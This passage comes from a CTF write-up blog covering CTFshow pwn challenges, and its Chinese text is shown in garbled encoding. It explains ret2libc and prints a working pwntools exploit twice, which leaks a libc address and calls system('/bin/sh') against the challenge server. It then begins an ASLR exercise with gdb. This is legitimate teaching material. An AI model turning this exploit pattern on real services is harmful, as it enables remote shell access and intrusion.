<p>ä»¥writeå‡½æ•°ä¸ºä¾‹ ï¼Œåç§» = çœŸå®åœ°å€ - libcåŸºå€ï¼ŒçœŸå®åœ°å€å­˜åœ¨write@gotã€write@gotå¯ä»¥é€šè¿‡write@pltæ¥è¿è¡Œè¿™ä¸ªå‡½æ•°ä»è€Œæ³„éœ²å‡ºæ¥ï¼Œlibc ç‰ˆæœ¬å’ŒåŸºå€å¯ä»¥å¯¼å…¥ libcSearcher åº“æ¥æŸ¥æ‰¾è®¡ç®—è¿™é‡Œéœ€è¦å»ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹ï¼ˆ<a class="link" href="https://expl0rer.top/p/pwn-1/#plt%e4%b8%8egot"  target="_blank" rel="noopener"
    >æœ‰å…³.gotã€.pltè¡¨çš„çŸ¥è¯†</a>ï¼‰ï¼Œç®€å•ç”»ä¸ªå›¾è¯´æ˜ä¸€ä¸‹é»„è‰²éƒ¨åˆ†æ˜¯é™æ€çš„ï¼Œç»¿è‰²éƒ¨åˆ†æ˜¯åŠ¨æ€å˜åŒ–çš„ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/88.png"
	width="742"
	height="207"
	srcset="/p/ctfshow-pwn-writeup/88_hu_f4cd45bfba752e2c.png 480w, /p/ctfshow-pwn-writeup/88_hu_6305d23fee54b4e3.png 1024w"
	loading="lazy"
	
		alt="åŠ¨æ€é“¾æ¥åº“çš„è¿‡ç¨‹"
	
	
		class="gallery-image" 
		data-flex-grow="358"
		data-flex-basis="860px"
	
></p>
<p>elf.got[&lsquo;write&rsquo;]çš„ä½œç”¨æ˜¯è·å– writeå‡½æ•°çœŸå®åœ°å€çš„å­˜å‚¨ä½ç½®ï¼Œå³write@gotçš„åœ°å€ï¼›</p>
<p>elf.plt[&lsquo;write&rsquo;]çš„ä½œç”¨æ˜¯è·å– writeå‡½æ•°è·³æ¿åœ°å€çš„å­˜å‚¨ä½ç½®ï¼Œå³write@pltçš„åœ°å€ï¼›</p>
<blockquote>
<p>å…·ä½“æ€è·¯ï¼š</p>
<ol>
<li>è§£æç›®æ ‡ç¨‹åºçš„ ELF æ–‡ä»¶ï¼Œè¯»å–write@pltçš„åœ°å€ ã€write@gotçš„åœ°å€å’Œctfshowçš„å‡½æ•°åœ°å€ã€‚</li>
<li>ä»¥æ ˆæº¢å‡ºæ¼æ´ä½œä¸ºå…¥å£ï¼Œè·³è½¬åˆ°write@pltæ‰§è¡Œå‡½æ•°æ³„éœ²write@gotçš„åœ°å€ï¼Œå†è·³è½¬å›ctfshowå‡½æ•°ã€‚</li>
<li>è¯»å–æ³„éœ²å‡ºçš„write@gotçš„åœ°å€ï¼Œç”¨ libcSearcher åº“æŸ¥æ‰¾æ­£ç¡®çš„ libc ç‰ˆæœ¬ï¼Œå†è®¡ç®—åç§»ã€‚</li>
<li>è®¡ç®—systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²çš„çœŸå®åœ°å€ã€‚</li>
<li>ç»§ç»­ä»ctfshowå‡½æ•°é‡Œçš„æ ˆæº¢å‡ºä½œä¸ºå…¥å£ï¼Œè·³è½¬åˆ°systemå‡½æ•°çœŸå®åœ°å€ï¼ŒåŒæ—¶å°†/bin/shä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œä»è€Œæ‹¿åˆ°æƒé™ã€‚</li>
</ol></blockquote>
<p>&hellip;.<a class="link" href="https://www.cnblogs.com/Claire-cat/articles/19029030"  target="_blank" rel="noopener"
    >ä»CTFshow-PWNå…¥é—¨-pwn25åˆ†æret2libcåŸç†ä¸å®ç° - Claire_cat - åšå®¢å›­</a></p>
<p>ret2libcæ”»å‡»ï¼ˆå³å…ˆæ‰¾åˆ°æ ˆæº¢å‡ºæ¼æ´ï¼Œé€šè¿‡writeå‡½æ•°æ³„éœ² write å‡½æ•°çš„çœŸå®åœ°å€ï¼Œæ ¹æ®æ³„éœ²çš„ write å‡½æ•°åœ°å€ï¼Œä½¿ç”¨ LibcSearcher æ¥æœç´¢ libc åº“ä¸­ç›¸åº”çš„å‡½æ•°åœ°å€å’Œå­—ç¬¦ä¸²åœ°å€ï¼Œè·å– system å‡½æ•°å’Œ&quot;/bin/sh&quot; å­—ç¬¦ä¸²çš„åœ°å€ã€‚æ„é€ æ–°çš„ payloadï¼Œä½¿ç”¨æ³„éœ²çš„ system å‡½æ•°å’Œ &ldquo;/bin/sh&rdquo; å­—ç¬¦ä¸²çš„åœ°å€æ¥è¿›è¡Œget shellï¼‰</p>
<p>expå¤‡æ³¨ç‰ˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1"># å¯¼å…¥pwntoolsåº“ï¼Œæä¾›æ¼æ´åˆ©ç”¨å¸¸ç”¨åŠŸèƒ½ï¼ˆå¦‚è¿æ¥ã€æ‰“åŒ…ç­‰ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1"># å¯¼å…¥LibcSearcherï¼Œç”¨äºæ ¹æ®æ³„éœ²çš„å‡½æ•°åœ°å€æŸ¥æ‰¾å¯¹åº”libcç‰ˆæœ¬</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œæ˜¾ç¤ºè¯¦ç»†çš„äº¤äº’è¿‡ç¨‹ï¼ˆæ–¹ä¾¿è°ƒè¯•ï¼‰</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å»ºç«‹ä¸ç›®æ ‡æœåŠ¡çš„è¿æ¥ï¼ˆè¿œç¨‹æœåŠ¡å™¨åœ°å€å’Œç«¯å£ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28298</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åŠ è½½ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè·å–ç¬¦å·ä¿¡æ¯ï¼ˆå¦‚å‡½æ•°åœ°å€ã€GOTè¡¨åœ°å€ç­‰ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–mainå‡½æ•°çš„åœ°å€ï¼ˆç”¨äºç¬¬ä¸€æ¬¡æº¢å‡ºåè·³å›mainå‡½æ•°ï¼Œè¿›è¡ŒäºŒæ¬¡æ”»å‡»ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–writeå‡½æ•°çš„GOTè¡¨åœ°å€ï¼ˆGlobal Offset Tableï¼Œå­˜å‚¨å‡½æ•°çš„çœŸå®å†…å­˜åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–writeå‡½æ•°çš„PLTè¡¨åœ°å€ï¼ˆProcedure Linkage Tableï¼Œç”¨äºé—´æ¥è°ƒç”¨å‡½æ•°ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ ç¬¬ä¸€æ¬¡æ”»å‡»çš„payloadï¼ˆæ ˆæº¢å‡ºåˆ©ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1. å¡«å……ç¼“å†²åŒºåˆ°è¿”å›åœ°å€ï¼š0x88æ˜¯ç¼“å†²åŒºå¤§å°ï¼Œ0x4æ˜¯ebpå¯„å­˜å™¨å¤§å°ï¼ˆ32ä½ç¨‹åºï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2. è¿”å›åœ°å€ï¼šè¦†ç›–ä¸ºwrite@pltï¼ˆè°ƒç”¨writeå‡½æ•°è¾“å‡ºæ•°æ®ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 3. writeæ‰§è¡Œå®Œåè·³è½¬çš„åœ°å€ï¼šmainå‡½æ•°ï¼ˆå›åˆ°ç¨‹åºå¼€å¤´ï¼Œæ–¹ä¾¿ç¬¬äºŒæ¬¡æ”»å‡»ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 4. writeå‡½æ•°çš„å‚æ•°1ï¼šæ–‡ä»¶æè¿°ç¬¦0ï¼ˆé”™è¯¯ï¼åº”ä¸º1ï¼Œstdoutæ ‡å‡†è¾“å‡ºï¼Œå¦åˆ™æ— æ³•æ­£ç¡®æ³„éœ²æ•°æ®ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 5. writeå‡½æ•°çš„å‚æ•°2ï¼šè¦æ³„éœ²çš„åœ°å€ï¼ˆwrite@gotï¼Œå­˜å‚¨writeçš„çœŸå®å†…å­˜åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 6. writeå‡½æ•°çš„å‚æ•°3ï¼šæ³„éœ²çš„å­—èŠ‚æ•°ï¼ˆ4å­—èŠ‚ï¼Œ32ä½åœ°å€é•¿åº¦ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ç¬¬ä¸€æ¬¡payloadï¼Œè§¦å‘æ ˆæº¢å‡ºï¼Œæ‰§è¡Œwriteå‡½æ•°æ³„éœ²åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ¥æ”¶æ³„éœ²çš„writeå‡½æ•°çœŸå®åœ°å€ï¼ˆ4å­—èŠ‚ï¼Œ32ä½ï¼‰ï¼Œå¹¶è½¬æ¢ä¸ºæ•´æ•°</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>  <span class="c1"># æ‰“å°æ³„éœ²çš„åœ°å€ï¼ˆåå…­è¿›åˆ¶ï¼‰</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä½¿ç”¨LibcSearcheræ ¹æ®writeå‡½æ•°åœ°å€æŸ¥æ‰¾å¯¹åº”çš„libcç‰ˆæœ¬</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—libcçš„åŸºåœ°å€ï¼šlibcåŸºåœ°å€ = æ³„éœ²çš„å‡½æ•°åœ°å€ - è¯¥å‡½æ•°åœ¨libcä¸­çš„åç§»é‡</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—systemå‡½æ•°çš„åœ°å€ï¼šsystemåœ°å€ = libcåŸºåœ°å€ + systemåœ¨libcä¸­çš„åç§»é‡</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—&#34;/bin/sh&#34;å­—ç¬¦ä¸²çš„åœ°å€ï¼šbin_shåœ°å€ = libcåŸºåœ°å€ + å­—ç¬¦ä¸²åœ¨libcä¸­çš„åç§»é‡</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ ç¬¬äºŒæ¬¡æ”»å‡»çš„payloadï¼ˆè·å–shellï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1. åŒæ ·çš„å¡«å……ï¼šè¦†ç›–ç¼“å†²åŒºå’Œebp</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2. è¿”å›åœ°å€ï¼šè¦†ç›–ä¸ºsystemå‡½æ•°åœ°å€ï¼ˆè°ƒç”¨systemæ‰§è¡Œå‘½ä»¤ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 3. systemæ‰§è¡Œå®Œåè·³è½¬çš„åœ°å€ï¼šmainå‡½æ•°ï¼ˆå¯é€‰ï¼Œä¸å½±å“shellä½¿ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 4. systemå‡½æ•°çš„å‚æ•°ï¼š&#34;/bin/sh&#34;å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆæ‰§è¡Œè¯¥å‘½ä»¤è·å–äº¤äº’shellï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ç¬¬äºŒæ¬¡payloadï¼Œè§¦å‘æ ˆæº¢å‡ºï¼Œæ‰§è¡Œsystem(&#34;/bin/sh&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œä¸è·å–çš„shellè¿›è¡Œäº¤äº’ï¼ˆè¾“å…¥å‘½ä»¤ç­‰ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŸç‰ˆexpï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28298</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„å†…å®¹ä¸ºåç»­æ ˆéƒ¨åˆ†è®²è§£å†…å®¹ï¼Œç›®å‰WPåœ¨å‰é¢ä¸åšè¯¦ç»†è®²è§£ï¼Œç›®çš„ä»…ä¸ºäº†æ¼”ç¤ºåœ¨å¼€å¯æŸäº›ä¿æŠ¤å¯ä»¥ä½¿ç”¨å“ªäº›æ”»å‡»æ‰‹æ³•ï¼ˆå¥½å§å…¶å®æˆ‘ä¹Ÿä¸ä¼šï¼Œè¿™äº›æ˜¯æŠ„çš„wpï¼Œè¿™é‡Œç­‰æˆ‘å­¦ä¼šæ ˆè¿™éƒ¨åˆ†æˆ‘å†æ¥è§£å†³ï¼ŒPWNç¡®å®å…¥é—¨æ¯”è¾ƒéš¾ï¼Œæ·±å…¥å­¦æ›´éš¾&hellip;.ï¼‰</p>
<p>æ„Ÿè§‰å¼ºåº¦ä¸Šæ¥äº†ï¼Œåšå¾—æœ‰ç‚¹åƒåŠ›ã€‚</p>
<h3 id="pwn_026">PWN_026
</h3><p>é¢˜ç›®ï¼šè®¾ç½®å¥½ ASLR ä¿æŠ¤å‚æ•°å€¼å³å¯è·å¾—flagã€‚ä¸ºç¡®ä¿flagæ­£ç¡®ï¼Œæœ¬é¢˜å»ºè®®ç”¨æä¾›è™šæ‹Ÿæœºè¿è¡Œã€‚  <a class="link" href="PWN_26%5cPWN" >PWN</a>  <a class="link" href="https://pan.baidu.com/s/1aBhaQfgcw4m2ut6ybNOBmA"  target="_blank" rel="noopener"
    >libc-2.27.so</a> ï¼ˆæå–ç showï¼‰</p>
<p>è¿™é¢˜å‘åˆ°æˆ‘äº†ï¼Œè¿è¡Œç¨‹åºå‘ç°ç›´æ¥çˆ†flagï¼Œäº¤ä¸Šå»å‘ç°æ˜¯å‡çš„/(ã„’oã„’)/~~</p>
<p>IDAx64åˆ†æï¼Œæœ‰systemåé—¨å‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/70.png"
	width="1195"
	height="590"
	srcset="/p/ctfshow-pwn-writeup/70_hu_5af04d0f0913cda9.png 480w, /p/ctfshow-pwn-writeup/70_hu_4cf51b4305482ce.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="486px"
	
></p>
<p>è€Œä¸”å¯ä»¥çŸ¥é“è¿™ä¸ªflagæ˜¯æœ‰å‡ ä¸ªprintfã€putså…±åŒæ‰“å°å‡ºçš„ã€å­—ç¬¦ä¸²ç”±åœ°å€æ‹¼æ¥ï¼ˆ%pæ‰“å°æŒ‡é’ˆæˆ–è€…åœ°å€ï¼Œä»¥16è¿›åˆ¶å½¢å¼ï¼‰è€Œæˆã€‚</p>
<p>è¿è¡Œä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/71.png"
	width="1250"
	height="719"
	srcset="/p/ctfshow-pwn-writeup/71_hu_e57bc28849d3c88.png 480w, /p/ctfshow-pwn-writeup/71_hu_1586fa3609ae168d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="417px"
	
></p>
<p>æ¯æ¬¡flagéƒ½ä¸ä¸€æ ·ï¼Œè¯´æ˜åœ°å€ä¸€ç›´åœ¨å˜åŒ–ï¼Œä¹Ÿå°±æ˜¯åœ°å€éšæœºåŒ–ã€‚</p>
<p>åœ¨Linuxä¿æŠ¤æœºåˆ¶æœ‰è®²è¿‡ASLRï¼Œå…³äº<a class="link" href="http://localhost:1313/p/pwn-1/#pie%e5%92%8caslr"  target="_blank" rel="noopener"
    >ASLRä¿æŠ¤å¯ä»¥çœ‹å›PWN-1</a>ï¼šASLRï¼ˆAddress Space Layout Randomizationï¼‰æ˜¯ä¸€ç§æ“ä½œç³»ç»Ÿçº§åˆ«çš„å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œæ—¨åœ¨å¢åŠ è½¯ä»¶ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚å®ƒé€šè¿‡éšæœºåŒ–ç¨‹åºåœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼Œä½¿å¾—æ”»å‡»è€…éš¾ä»¥å‡†ç¡®åœ°ç¡®å®šå…³é”®ä»£ç å’Œæ•°æ®çš„ä½ç½®ã€‚</p>
<p>gdbè°ƒè¯•ä¸€ä¸‹ï¼Œé¢˜ç›®æ—©ç»™å‡ºäº†2ï¼Œåœ¨è¿™é‡Œå•çº¯æ¼”ç¤ºä¸€ä¸‹ï¼›</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb -q pwn
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/72.png"
	width="1110"
	height="410"
	srcset="/p/ctfshow-pwn-writeup/72_hu_f7e2f4bac4aac2dd.png 480w, /p/ctfshow-pwn-writeup/72_hu_1517f77077b3d7c7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="270"
		data-flex-basis="649px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell cat /proc/sys/kernel/randomize_va_space
</span></span></code></pre></td></tr></table>
</div>
